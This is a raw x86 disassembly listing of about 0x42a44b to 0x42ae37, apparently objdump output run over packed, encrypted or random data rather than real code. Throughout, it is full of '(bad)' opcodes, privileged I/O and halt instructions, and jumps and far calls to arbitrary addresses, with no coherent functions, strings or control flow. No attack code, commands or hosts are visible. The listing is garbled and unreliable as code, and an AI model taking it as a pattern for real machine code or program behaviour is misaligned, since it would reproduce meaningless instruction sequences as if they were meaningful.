  42a44b:	add    BYTE PTR [edi],dh
  42a44d:	push   ebp
  42a44e:	cmp    al,0xfb
  42a450:	(bad)  
  42a451:	mov    ah,0x45
  42a453:	arpl   WORD PTR [edi-0x5b],cx
  42a456:	inc    edi
  42a457:	add    ebx,0xffffffda
  42a45a:	and    eax,ebp
  42a45c:	bound  eax,QWORD PTR [esp+eax*8-0x40]
  42a460:	jmp    0x42a4c6
  42a462:	fs push 0x41346b6b
  42a468:	cmp    bh,BYTE PTR [edx]
  42a46a:	lock xchg edi,esp
  42a46d:	jb     0x42a411
  42a46f:	hlt    
  42a470:	xchg   esp,eax
  42a471:	adc    ecx,edx
  42a473:	pop    es
  42a474:	in     eax,dx
  42a475:	dec    edx
  42a476:	xor    bh,bh
  42a478:	bound  eax,QWORD PTR [ebp+0x13]
  42a47b:	push   eax
  42a47c:	ror    BYTE PTR ds:0xef4c3193,0x8d
  42a483:	cwde   
  42a484:	cmp    edx,DWORD PTR [edi+0x70e5db4f]
  42a48a:	xor    al,0xe2
  42a48c:	test   DWORD PTR [edx],0x29c5773b
  42a492:	adc    DWORD PTR [edx-0x2a],eax
  42a495:	sbb    BYTE PTR [edi-0x29502777],ah
  42a49b:	mov    edi,DWORD PTR [ecx-0x2d]
  42a49e:	popa   
  42a49f:	test   DWORD PTR [ebx],esi
  42a4a1:	sub    al,dh
  42a4a3:	adc    BYTE PTR [esi],ah
  42a4a5:	adc    BYTE PTR [esi-0x1d],ah
  42a4a8:	xor    BYTE PTR [eax+ebx*1-0x3b644b53],ch
  42a4af:	xchg   bl,dh
  42a4b1:	daa    
  42a4b2:	mov    dh,0xd2
  42a4b4:	outs   dx,BYTE PTR ds:[esi]
  42a4b5:	or     eax,0x59785a6c
  42a4ba:	fucomi st,st(5)
  42a4bc:	jo     0x42a482
  42a4be:	mov    eax,0xbcc5262c
  42a4c3:	and    eax,0x29f6d687
  42a4c8:	or     DWORD PTR [ecx-0x295e9709],0xbff350f7
  42a4d2:	retf   
  42a4d3:	xchg   BYTE PTR [ecx],cl
  42a4d5:	pop    eax
  42a4d6:	fwait
  42a4d7:	xchg   edi,eax
  42a4d8:	jnp    0x42a48e
  42a4da:	hlt    
  42a4db:	sub    al,0x4a
  42a4dd:	cmp    al,0x90
  42a4df:	(bad)  
  42a4e0:	das    
  42a4e1:	sbb    BYTE PTR [eax-0x6932cc03],ch
  42a4e7:	and    DWORD PTR [esi+0x2eeb5a96],edi
  42a4ed:	push   esp
  42a4ee:	retf   
  42a4ef:	mov    bh,0x7f
  42a4f1:	mov    al,cl
  42a4f3:	mov    esp,0xb7619974
  42a4f8:	inc    eax
  42a4f9:	jne    0x42a511
  42a4fb:	xcrypt-ecb (bad)
  42a4fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4fd:	mov    ecx,ebp
  42a4ff:	loopne 0x42a573
  42a501:	out    0x5b,eax
  42a503:	cld    
  42a504:	mov    dl,0xbe
  42a506:	mov    ds:0x66cbc4b5,eax
  42a50b:	in     al,dx
  42a50c:	das    
  42a50d:	fwait
  42a50e:	sub    DWORD PTR [edx-0x6bf22624],edx
  42a514:	add    ah,BYTE PTR [esi]
  42a516:	(bad)  
  42a517:	xor    BYTE PTR ss:[esp+edi*1-0x5e2ea9fb],0xd6
  42a520:	icebp  
  42a521:	repz cmp cl,cl
  42a524:	sub    eax,0x4c7e9ae7
  42a529:	cld    
  42a52a:	leave  
  42a52b:	push   ecx
  42a52c:	jo     0x42a4e0
  42a52e:	xor    al,BYTE PTR [edi-0x68]
  42a531:	imul   esp,DWORD PTR [edx-0x71],0xffffffb5
  42a535:	sub    eax,0x679598d2
  42a53a:	mov    edi,0x74b05fc2
  42a53f:	inc    esi
  42a540:	and    al,BYTE PTR [eax]
	...
  42a5b2:	add    BYTE PTR [eax],al
  42a5b4:	ins    DWORD PTR es:[edi],dx
  42a5b5:	sbb    eax,0xfbf6c0e6
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	add    cl,cl
  42a5c2:	cmp    BYTE PTR [esi*4-0xafffe40],ch
  42a5c9:	add    BYTE PTR [eax],al
  42a5cb:	add    cl,bl
  42a5cd:	adc    BYTE PTR [eax+0x6f],cl
  42a5d0:	retf   
  42a5d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a5d2:	pusha  
  42a5d3:	mov    esi,0x3f5d7ebf
  42a5d8:	and    BYTE PTR [ebx+0x42],dl
  42a5db:	sbb    al,dh
  42a5dd:	push   esi
  42a5de:	(bad)  
  42a5df:	mov    eax,ds:0x5383d145
  42a5e4:	xchg   esp,eax
  42a5e5:	push   es
  42a5e6:	adc    BYTE PTR [ecx+eax*1-0x783a26d3],ch
  42a5ed:	aad    0x25
  42a5ef:	jmp    0xd03f2d6c
  42a5f4:	xchg   BYTE PTR [ecx+eiz*8-0x5b24c138],bh
  42a5fb:	jno    0x42a591
  42a5fd:	adc    edx,DWORD PTR [edx+0x4e]
  42a600:	jecxz  0x42a65e
  42a602:	adc    BYTE PTR [ebx],cl
  42a604:	call   FWORD PTR [ebx+eiz*8-0x80]
  42a608:	xor    BYTE PTR [ebp-0x7eff227b],dh
  42a60e:	aas    
  42a60f:	loop   0x42a5df
  42a611:	mov    ebx,0x36006e34
  42a616:	and    DWORD PTR [ecx+0x7a],0x3e
  42a61a:	out    0x58,al
  42a61c:	(bad)  
  42a61d:	mov    DWORD PTR [eax+ecx*4+0x3c684ced],esi
  42a624:	mov    al,al
  42a626:	xor    BYTE PTR [ebp-0x2e],0x30
  42a62a:	mov    bl,0x30
  42a62c:	fstp   st(5)
  42a62e:	pop    ss
  42a62f:	popa   
  42a630:	pushf  
  42a631:	ja     0x42a5c4
  42a633:	adc    ebp,DWORD PTR [ebp+edi*2-0x49]
  42a637:	imul   esi,DWORD PTR [edx],0x64df12e8
  42a63d:	push   ds
  42a63e:	inc    esi
  42a63f:	jecxz  0x42a684
  42a641:	sub    BYTE PTR [ebx-0x1d],cl
  42a644:	repz aas 
  42a646:	pop    ss
  42a647:	hlt    
  42a648:	mov    ecx,0xcd6ba3fc
  42a64d:	repnz loop 0x42a6a4
  42a650:	mov    cl,0x38
  42a652:	cmp    eax,0xad0393e0
  42a657:	pop    edx
  42a658:	sub    bh,BYTE PTR [esi]
  42a65a:	ficom  WORD PTR [ebp+0x3d384b18]
  42a660:	das    
  42a661:	cs xor al,0x3e
  42a664:	lods   al,BYTE PTR ds:[esi]
  42a665:	sahf   
  42a666:	les    ebp,FWORD PTR [eax+ebp*2]
  42a669:	inc    esp
  42a66a:	xor    DWORD PTR [edx-0x751ee479],0x2a7ca4cf
  42a674:	push   0xffffffdb
  42a676:	mov    dl,BYTE PTR [esi+0x13]
  42a679:	pop    ds
  42a67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a67b:	hlt    
  42a67c:	ja     0x42a6e7
  42a67e:	mov    WORD PTR [ecx+edi*2],fs
  42a681:	sete   BYTE PTR [ecx+0x6fb7723d]
  42a688:	jns    0x42a68b
  42a68a:	dec    edx
  42a68b:	mov    edi,eax
  42a68d:	gs loope 0x42a67c
  42a690:	or     ah,bh
  42a692:	(bad)  [ecx+0x15705a70]
  42a698:	add    eax,esi
  42a69a:	mov    bh,0x1
  42a69c:	dec    esi
  42a69d:	stos   BYTE PTR es:[edi],al
  42a69e:	xchg   edi,eax
  42a69f:	repz fnsave [edi+0x69]
  42a6a3:	cmp    BYTE PTR [edx-0x7ed061df],bh
  42a6a9:	(bad)  
  42a6aa:	push   edx
  42a6ab:	pop    es
  42a6ac:	nop    DWORD PTR [edi]
  42a6af:	or     DWORD PTR [edx+edx*1],edi
  42a6b2:	pop    ss
  42a6b3:	xchg   DWORD PTR [esi],ebp
  42a6b5:	xchg   DWORD PTR [edi+0x49a123cb],eax
  42a6bb:	jecxz  0x42a688
  42a6bd:	sub    BYTE PTR [eax+0xb6eb],dl
	...
  42a733:	add    BYTE PTR [eax],dh
  42a735:	inc    edx
  42a736:	fbld   TBYTE PTR [edx-0x1]
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	int    0x78
  42a742:	sub    bl,dl
  42a744:	stos   BYTE PTR es:[edi],al
  42a745:	rol    DWORD PTR [ecx],0x0
  42a748:	cmc    
  42a749:	add    BYTE PTR [eax],al
  42a74b:	add    BYTE PTR [edi-0xf],cl
  42a74e:	jmp    0xe0ff:0xdd5aaf8b
  42a755:	or     cl,bh
  42a757:	fcmovbe st,st(3)
  42a759:	retf   
  42a75a:	fisubr DWORD PTR [edi-0x6]
  42a75d:	clc    
  42a75e:	mov    BYTE PTR [eax-0x45821b23],bl
  42a764:	(bad)  
  42a765:	ins    BYTE PTR es:[edi],dx
  42a766:	adc    ebx,ecx
  42a768:	icebp  
  42a769:	fistp  WORD PTR [ebp-0x59]
  42a76c:	sbb    eax,0xd4764d3e
  42a771:	aam    0x39
  42a773:	mov    ecx,0xb758459f
  42a778:	xchg   ecx,eax
  42a779:	mov    ebp,0xbbc39cab
  42a77e:	rep stos DWORD PTR es:[edi],eax
  42a780:	or     ebp,DWORD PTR [esi+0x255f1789]
  42a786:	out    0x7e,al
  42a788:	push   esi
  42a789:	mov    ecx,0xf11be684
  42a78e:	mov    bl,0xb0
  42a790:	ss mov esp,fs
  42a793:	aad    0xfc
  42a795:	adc    edx,ebp
  42a797:	xchg   ebp,eax
  42a798:	mov    esp,ebp
  42a79a:	ins    DWORD PTR es:[edi],dx
  42a79b:	jns    0x42a7ff
  42a79d:	push   esp
  42a79e:	sar    DWORD PTR [esp+eiz*2+0x0],cl
  42a7a2:	aad    0x41
  42a7a4:	xchg   esp,eax
  42a7a5:	dec    ecx
  42a7a6:	dec    edi
  42a7a7:	push   ebp
  42a7a8:	jbe    0x9cc5a87d
  42a7ae:	loop   0x42a7f4
  42a7b0:	pop    edi
  42a7b1:	jg     0x42a7c8
  42a7b3:	cmp    edi,edi
  42a7b5:	mov    ?,ecx
  42a7b7:	jge    0x42a7ac
  42a7b9:	fwait
  42a7ba:	ret    0x189a
  42a7bd:	out    dx,al
  42a7be:	lods   eax,DWORD PTR ds:[esi]
  42a7bf:	pop    ebp
  42a7c0:	les    esi,FWORD PTR ds:0x40abbfe0
  42a7c6:	imul   ebp,ebx,0x6
  42a7c9:	loope  0x42a817
  42a7cb:	sbb    BYTE PTR [edx],al
  42a7cd:	mov    esp,0x675b5634
  42a7d2:	les    ecx,FWORD PTR [esi+0x2]
  42a7d5:	pop    es
  42a7d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7d7:	sub    DWORD PTR [eax],0xffffffdc
  42a7da:	dec    edi
  42a7db:	push   ecx
  42a7dc:	inc    edx
  42a7dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7de:	test   eax,0x4c4ae827
  42a7e3:	fidivr WORD PTR [ecx+0x73]
  42a7e6:	fisubr DWORD PTR [eax-0x73]
  42a7e9:	jae    0x42a831
  42a7eb:	gs inc eax
  42a7ed:	lea    ebp,[ecx]
  42a7ef:	mov    edi,esi
  42a7f1:	mov    ah,0xea
  42a7f3:	jmp    0x42a84f
  42a7f5:	mov    ebp,0x9309a4c9
  42a7fa:	rol    BYTE PTR [edx+0x7ff288a1],0x25
  42a801:	dec    edi
  42a802:	add    cl,al
  42a804:	dec    eax
  42a805:	push   ss
  42a806:	add    bl,BYTE PTR [edx]
  42a808:	mov    eax,DWORD PTR [eax]
  42a80a:	sti    
  42a80b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a80c:	cmp    DWORD PTR [esi],esi
  42a80e:	mov    dl,0xdb
  42a810:	in     eax,0x86
  42a812:	jae    0x42a884
  42a814:	ror    BYTE PTR [ebx+edi*1+0x200dc899],0x69
  42a81c:	xor    ebx,DWORD PTR [edx]
  42a81e:	xor    ecx,DWORD PTR [edx]
  42a820:	sub    al,0x2e
  42a822:	xor    BYTE PTR [esi+ecx*1+0x492bf254],ch
  42a829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a82a:	daa    
  42a82b:	test   BYTE PTR [ecx],cl
  42a82d:	ins    BYTE PTR es:[edi],dx
  42a82e:	(bad)  
  42a82f:	adc    edi,eax
  42a831:	inc    edx
  42a832:	mul    BYTE PTR [esi-0x1412b77c]
  42a838:	outs   dx,BYTE PTR ds:[esi]
  42a839:	je     0x42a836
  42a83b:	dec    edi
  42a83c:	pop    ebx
  42a83d:	mov    al,ds:0x8880aa
	...
  42a8b2:	add    BYTE PTR [eax],al
  42a8b4:	push   edi
  42a8b5:	push   0xdf7fdf64
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	mov    eax,ds:0x9fb6696c
  42a8c5:	ret    0x1
  42a8c8:	cmc    
  42a8c9:	add    BYTE PTR [eax],al
  42a8cb:	add    BYTE PTR [ebp-0x69],al
  42a8ce:	retf   0xa7e7
  42a8d1:	cdq    
  42a8d2:	sub    al,0xd5
  42a8d4:	inc    edx
  42a8d5:	xchg   edx,eax
  42a8d6:	pop    es
  42a8d7:	repz cmp al,0xf7
  42a8da:	xor    al,0x87
  42a8dc:	or     al,0xfd
  42a8de:	adc    eax,0x17372e65
  42a8e3:	test   BYTE PTR [ebx-0x13e6cffa],ch
  42a8e9:	pop    edi
  42a8ea:	leave  
  42a8eb:	imul   esp,DWORD PTR [edi+0x4b],0x6ce5afdd
  42a8f2:	(bad)  
  42a8f3:	and    cl,al
  42a8f5:	add    esi,DWORD PTR [ebp+0x7b]
  42a8f8:	add    eax,0x13ec8a76
  42a8fd:	in     eax,0x8d
  42a8ff:	(bad)  
  42a900:	in     eax,0x11
  42a902:	aaa    
  42a903:	jno    0x42a93a
  42a905:	fst    QWORD PTR [esi]
  42a907:	and    eax,0xac928682
  42a90c:	enter  0xa114,0xcc
  42a910:	stos   DWORD PTR es:[edi],eax
  42a911:	lods   eax,DWORD PTR ds:[esi]
  42a912:	gs cli 
  42a914:	xchg   esi,eax
  42a915:	(bad)  
  42a917:	mov    esp,DWORD PTR [edx+0x7bb67ba2]
  42a91d:	in     al,dx
  42a91e:	pusha  
  42a91f:	fwait
  42a920:	push   0x50ed7580
  42a925:	jnp    0x42a94e
  42a927:	sti    
  42a928:	jno    0x42a997
  42a92a:	shl    BYTE PTR [ecx+ecx*4+0x4d],cl
  42a92e:	gs into 
  42a930:	pop    ss
  42a931:	call   0x7141eb38
  42a936:	or     eax,0x9e66a3fd
  42a93b:	sub    BYTE PTR [ebx],0x7
  42a93e:	mov    bh,0xa
  42a940:	data16 jo 0x42a8ed
  42a943:	jne    0x42a99d
  42a945:	ss mov ebx,0xeab8fd7
  42a94b:	dec    ebx
  42a94c:	repz inc eax
  42a94e:	cmp    al,0xaa
  42a950:	mov    edx,0xb6a81f5d
  42a955:	das    
  42a956:	sbb    eax,0xbb243413
  42a95b:	mov    ds:0xdf443f1d,al
  42a960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a961:	push   0xffffffe9
  42a963:	push   ds
  42a964:	in     al,0x2
  42a966:	xor    al,al
  42a968:	xor    BYTE PTR [ebx],0x5e
  42a96b:	fs ret 
  42a96d:	push   es
  42a96e:	adc    BYTE PTR [ebx+0x74498886],dh
  42a974:	mov    esp,0x878a747e
  42a979:	mov    bl,0x88
  42a97b:	rcl    BYTE PTR [esp+ebx*8+0x10ecc22],cl
  42a982:	stc    
  42a983:	xor    BYTE PTR [ecx+0x1b8ef6ed],cl
  42a989:	fmul   QWORD PTR es:[edi+esi*1]
  42a98d:	mov    cl,0x18
  42a98f:	mov    ebp,0xdf62e80e
  42a994:	sbb    ecx,0x6a
  42a997:	aaa    
  42a998:	or     eax,0xb5c7de29
  42a99d:	imul   esi,DWORD PTR [ebp+0xc],0x7c
  42a9a1:	sahf   
  42a9a2:	sub    dl,BYTE PTR ds:[esi+0x5f]
  42a9a6:	jmp    0x1ada:0xf6f21937
  42a9ad:	sub    ecx,DWORD PTR [ebx+0x5e]
  42a9b0:	jae    0x42a9cb
  42a9b2:	inc    ebx
  42a9b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a9b4:	nop
  42a9b5:	sbb    edi,ecx
  42a9b7:	and    DWORD PTR ds:0x6e9cee44,edx
  42a9bd:	sub    edi,DWORD PTR [ebx+0xb887]
	...
  42aa33:	add    dh,cl
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	lods   eax,DWORD PTR ds:[esi]
  42aa41:	jns    0x42aa9d
  42aa43:	bound  edx,QWORD PTR [ebx+eax*8+0xf50001]
  42aa4a:	add    BYTE PTR [eax],al
  42aa4c:	and    DWORD PTR [esi-0x509118d9],ecx
  42aa52:	std    
  42aa53:	sub    DWORD PTR [ecx+0x72],ebx
  42aa56:	in     al,0x19
  42aa58:	pop    esp
  42aa59:	and    ebp,DWORD PTR [ecx+0x27]
  42aa5c:	inc    ecx
  42aa5d:	ins    BYTE PTR es:[edi],dx
  42aa5e:	jnp    0x42aa8f
  42aa60:	add    ah,BYTE PTR [esi-0x32f9944d]
  42aa66:	cli    
  42aa67:	xchg   ecx,eax
  42aa68:	data16 ja 0x42aa68
  42aa6b:	xchg   esp,eax
  42aa6c:	cwde   
  42aa6d:	dec    ebx
  42aa6e:	adc    ebx,ecx
  42aa70:	retf   0x42ed
  42aa73:	push   0x49565773
  42aa78:	mov    ds:0xf08e319b,al
  42aa7d:	push   ebx
  42aa7e:	cmp    al,0xc
  42aa80:	add    esp,DWORD PTR [edx]
  42aa82:	popa   
  42aa83:	leave  
  42aa84:	add    cl,0xc
  42aa87:	or     DWORD PTR [eax],edx
  42aa89:	xor    ebp,esi
  42aa8b:	adc    esi,DWORD PTR [edx-0x22]
  42aa8e:	mov    al,0x40
  42aa90:	aas    
  42aa91:	(bad)  
  42aa92:	adc    ah,BYTE PTR [ebp+esi*4-0x4e]
  42aa96:	inc    esi
  42aa97:	inc    edx
  42aa98:	dec    ebp
  42aa99:	sahf   
  42aa9a:	ror    BYTE PTR [edi],1
  42aa9c:	cmp    BYTE PTR [esi+0x79d62417],dl
  42aaa2:	sahf   
  42aaa3:	and    esi,DWORD PTR [edx-0x11816117]
  42aaa9:	pop    edi
  42aaaa:	jl     0x42aae0
  42aaac:	fwait
  42aaad:	push   edi
  42aaae:	push   ebx
  42aaaf:	jmp    0xb4e9:0xc73627ac
  42aab6:	jbe    0x42aaaa
  42aab8:	test   al,0xcd
  42aaba:	(bad)  
  42aabb:	xchg   esi,eax
  42aabc:	or     eax,0x7f025584
  42aac1:	test   eax,0xffc35ba2
  42aac6:	hlt    
  42aac7:	jmp    0x42aae5
  42aac9:	push   ecx
  42aaca:	popf   
  42aacb:	stos   DWORD PTR es:[edi],eax
  42aacc:	push   ecx
  42aacd:	shl    DWORD PTR [edx],cl
  42aacf:	jp     0x42ab1f
  42aad1:	nop
  42aad2:	pop    edx
  42aad3:	sar    ch,0x4
  42aad6:	test   DWORD PTR [esi-0x2f],esp
  42aad9:	sub    al,0x9c
  42aadb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aadc:	inc    edi
  42aadd:	ins    DWORD PTR es:[edi],dx
  42aade:	jns    0x42ab1c
  42aae0:	push   cs
  42aae1:	xchg   edx,eax
  42aae2:	xor    DWORD PTR [ecx-0x3b],ebp
  42aae5:	addr16 mov al,0x0
  42aae8:	in     eax,dx
  42aae9:	je     0x42aa9b
  42aaeb:	inc    edi
  42aaec:	lds    ebx,FWORD PTR [esi+0x8a9e995]
  42aaf2:	dec    esi
  42aaf3:	mov    cl,BYTE PTR [ebp-0x59]
  42aaf6:	sbb    eax,0xbb610feb
  42aafb:	cmp    ecx,eax
  42aafd:	or     BYTE PTR [edx+0x21],dh
  42ab00:	ror    BYTE PTR [ebx+0x49be3e62],cl
  42ab06:	imul   ebx,edi,0xffffffe7
  42ab09:	xor    al,0x13
  42ab0b:	push   0xb9b9db35
  42ab10:	inc    ebp
  42ab11:	jl     0x42ab8c
  42ab13:	inc    ebx
  42ab14:	in     eax,0x87
  42ab16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab17:	lods   al,BYTE PTR ds:[esi]
  42ab18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab19:	sub    ch,bl
  42ab1b:	pop    eax
  42ab1c:	inc    esi
  42ab1d:	loope  0x42ab6d
  42ab1f:	dec    esp
  42ab20:	loope  0x42ab70
  42ab22:	xor    BYTE PTR [ebx],ch
  42ab24:	sbb    edx,ebx
  42ab26:	mov    cl,0x19
  42ab28:	fsub   DWORD PTR [esi-0x6e]
  42ab2b:	out    dx,al
  42ab2c:	je     0x42ab75
  42ab2e:	add    DWORD PTR ds:0x7d72cc25,esi
  42ab34:	pusha  
  42ab35:	pop    eax
  42ab36:	mov    edx,0x72f8c962
  42ab3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab3c:	pop    es
  42ab3d:	adc    DWORD PTR [eax+0x348],edi
	...
  42abb3:	add    BYTE PTR [ebx-0x487759ea],ah
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	ins    BYTE PTR es:[edi],dx
  42abc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42abc2:	mov    edi,0x1c4892b
  42abc7:	add    ch,dh
  42abc9:	add    BYTE PTR [eax],al
  42abcb:	add    BYTE PTR [edi+0x70],al
  42abce:	mov    esi,0x4ea02b7
  42abd3:	mov    dl,0xa6
  42abd5:	jb     0x42abe7
  42abd7:	cld    
  42abd8:	sub    ebp,DWORD PTR [edx+esi*2-0x2]
  42abdc:	mov    cl,BYTE PTR [edi-0x11]
  42abdf:	test   DWORD PTR [ebx],0x958065f2
  42abe5:	inc    esp
  42abe6:	dec    eax
  42abe7:	iret   
  42abe8:	loope  0x42ac29
  42abea:	rcl    DWORD PTR [ecx+0x1ddffaf2],0x8f
  42abf1:	in     al,dx
  42abf2:	mov    esi,0xa2274160
  42abf7:	push   edx
  42abf8:	add    DWORD PTR [ebx],edi
  42abfa:	dec    esp
  42abfb:	or     ebp,ebx
  42abfd:	sbb    esp,ebp
  42abff:	test   BYTE PTR ds:0x123f3af6,ch
  42ac05:	test   BYTE PTR [eax-0x5580b5ef],cl
  42ac0b:	cli    
  42ac0c:	cdq    
  42ac0d:	fs xchg ebx,eax
  42ac0f:	sub    DWORD PTR [esi-0x6a5f663f],ecx
  42ac15:	aaa    
  42ac16:	loope  0x42ac68
  42ac18:	mov    esp,0xb2876f1c
  42ac1d:	push   es
  42ac1e:	clc    
  42ac1f:	ins    BYTE PTR es:[edi],dx
  42ac20:	pop    edi
  42ac21:	(bad)  
  42ac22:	in     eax,dx
  42ac23:	inc    esp
  42ac24:	mov    eax,ds:0xa8d13f23
  42ac29:	test   DWORD PTR [ebx-0x5d8eb0c5],esp
  42ac2f:	xor    edx,ebp
  42ac31:	cli    
  42ac32:	jbe    0x42ac8d
  42ac34:	fnstsw WORD PTR [edi+0x67f6e764]
  42ac3a:	es cdq 
  42ac3c:	sbb    dh,dl
  42ac3e:	aas    
  42ac3f:	cmc    
  42ac40:	push   0x5f4e90e8
  42ac45:	dec    edi
  42ac46:	sti    
  42ac47:	rol    DWORD PTR [edi],1
  42ac49:	fnstcw WORD PTR [ebx-0x51]
  42ac4c:	fs sbb al,0xa4
  42ac4f:	mov    ebx,0x35f06344
  42ac54:	cwde   
  42ac55:	sahf   
  42ac56:	push   ecx
  42ac57:	sbb    bh,BYTE PTR [esi+0x63a19c30]
  42ac5d:	(bad)  
  42ac5e:	cmp    ecx,DWORD PTR [ebx-0x35d48f9b]
  42ac64:	ret    
  42ac65:	imul   eax,DWORD PTR [ecx],0x2d
  42ac68:	and    al,0xfc
  42ac6a:	mov    ebp,DWORD PTR [ebx]
  42ac6c:	data16 mov dl,0xfb
  42ac6f:	mov    ebx,0x572d693c
  42ac74:	pop    edi
  42ac75:	minps  xmm6,XMMWORD PTR [edi-0x57434793]
  42ac7c:	rcl    BYTE PTR [ebp-0x78],cl
  42ac7f:	add    BYTE PTR ds:0xa3b0c6c,dh
  42ac85:	mov    ds,WORD PTR [esi+eax*8]
  42ac88:	retf   
  42ac89:	mov    al,ds:0xcf30f4c3
  42ac8e:	sub    DWORD PTR [edi+0x6e],esp
  42ac91:	or     ah,bh
  42ac93:	data16 in al,dx
  42ac95:	sahf   
  42ac96:	adc    DWORD PTR [edx-0x5f],ecx
  42ac99:	push   ecx
  42ac9a:	sbb    edi,0xffffff93
  42ac9d:	xchg   ecx,eax
  42ac9e:	sbb    BYTE PTR [esi+0x311a6f29],dl
  42aca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aca5:	xchg   esp,eax
  42aca6:	push   edx
  42aca7:	scas   eax,DWORD PTR es:[edi]
  42aca8:	pop    ebx
  42aca9:	fs enter 0x39ab,0xf4
  42acae:	add    eax,0x279ecfd3
  42acb3:	dec    esi
  42acb4:	repz (bad) 
  42acb8:	into   
  42acb9:	mov    WORD PTR [ecx],?
  42acbb:	lea    ebx,[ecx+0x43]
  42acbe:	cmp    BYTE PTR [edi],0x68
	...
  42ad31:	add    BYTE PTR [eax],al
  42ad33:	add    BYTE PTR [ebx-0x13f33b49],bl
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	divps  xmm0,XMMWORD PTR [ebp+eax*2+0x1c57e7d]
  42ad47:	add    ch,dh
  42ad49:	add    BYTE PTR [eax],al
  42ad4b:	add    cl,dh
  42ad4d:	xchg   esp,eax
  42ad4e:	retf   0xec9b
  42ad51:	or     DWORD PTR [edx+ebx*1],ecx
  42ad54:	loopne 0x42ada6
  42ad56:	adc    DWORD PTR [ebx],0xffffffc1
  42ad59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad5a:	inc    edi
  42ad5b:	dec    esi
  42ad5c:	and    DWORD PTR [edi+ebx*1+0x59],edi
  42ad60:	mov    ecx,0x41f9b77f
  42ad65:	cmp    ebp,edx
  42ad67:	push   ebx
  42ad68:	aad    0xc9
  42ad6a:	cmp    DWORD PTR [edx-0x20defd65],edi
  42ad70:	das    
  42ad71:	push   0x47
  42ad73:	pushf  
  42ad74:	lods   eax,DWORD PTR ds:[esi]
  42ad75:	push   cs
  42ad76:	test   eax,0x5efb1d48
  42ad7b:	ds aas 
  42ad7d:	inc    ecx
  42ad7e:	cmc    
  42ad7f:	cli    
  42ad80:	pop    eax
  42ad81:	mov    esp,0x94b9cdf1
  42ad86:	mov    ebx,0x403570cc
  42ad8b:	xor    al,bh
  42ad8d:	lods   al,BYTE PTR ds:[esi]
  42ad8e:	adc    edx,ebp
  42ad90:	dec    ecx
  42ad91:	adc    ebp,DWORD PTR [ebp+eiz*1+0x5]
  42ad95:	mov    esi,DWORD PTR [ecx]
  42ad97:	inc    esi
  42ad98:	cmp    esp,DWORD PTR [ecx+0x18]
  42ad9b:	int    0x3a
  42ad9d:	arpl   bx,si
  42ad9f:	test   BYTE PTR [ecx+0x1312a8ef],0xff
  42ada6:	mov    cl,0xd8
  42ada8:	mov    ?,WORD PTR [esi]
  42adaa:	(bad)  
  42adab:	(bad)  
  42adac:	in     al,0xb4
  42adae:	fisubr WORD PTR [edx+0xa]
  42adb1:	mov    dh,0x88
  42adb3:	pop    ds
  42adb4:	xchg   ecx,eax
  42adb5:	cdq    
  42adb6:	add    DWORD PTR [eax-0xe4bd61a],edi
  42adbc:	mov    al,0x55
  42adbe:	gs std 
  42adc0:	lock adc edi,DWORD PTR [edx+0x461a6569]
  42adc7:	xlat   BYTE PTR ds:[ebx]
  42adc8:	xor    al,0x75
  42adca:	ret    0x2200
  42adcd:	mov    dh,0x4f
  42adcf:	pop    ecx
  42add0:	loop   0x42adbc
  42add2:	xchg   ecx,eax
  42add3:	and    eax,0x4ca09c52
  42add8:	adc    bh,0xd2
  42addb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42addc:	aas    
  42addd:	cmp    DWORD PTR [esi-0x6e4430f1],eax
  42ade3:	out    0x42,eax
  42ade5:	pop    esi
  42ade6:	inc    esp
  42ade7:	enter  0x3846,0x34
  42adeb:	jmp    0x42ad85
  42aded:	and    eax,0x2fe28863
  42adf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42adf3:	rep ins BYTE PTR es:[edi],dx
  42adf5:	cld    
  42adf6:	push   edx
  42adf7:	clc    
  42adf8:	div    BYTE PTR [eax+0x33b9e14]
  42adfe:	or     BYTE PTR [eax],bl
  42ae00:	push   ebp
  42ae01:	dec    ebx
  42ae02:	lods   eax,DWORD PTR ds:[esi]
  42ae03:	int3   
  42ae04:	mov    ch,0xf6
  42ae06:	inc    esp
  42ae07:	pop    esp
  42ae08:	cmp    eax,0xc232fa45
  42ae0d:	xor    DWORD PTR [eax],0x3d87b82
  42ae13:	clc    
  42ae14:	popa   
  42ae15:	hlt    
  42ae16:	fimul  DWORD PTR [esi+0x26]
  42ae19:	clc    
  42ae1a:	loop   0x42ae4f
  42ae1c:	aaa    
  42ae1d:	adc    BYTE PTR [eax-0x78],0x1c
  42ae21:	enter  0x39eb,0x75
  42ae25:	cmp    eax,0x537b541c
  42ae2a:	xor    eax,0xaabe3a75
  42ae2f:	push   ecx
  42ae30:	jnp    0x42ae5d
  42ae32:	adc    eax,0xc39f4164
  42ae37:	or     eax,0xffffffd1
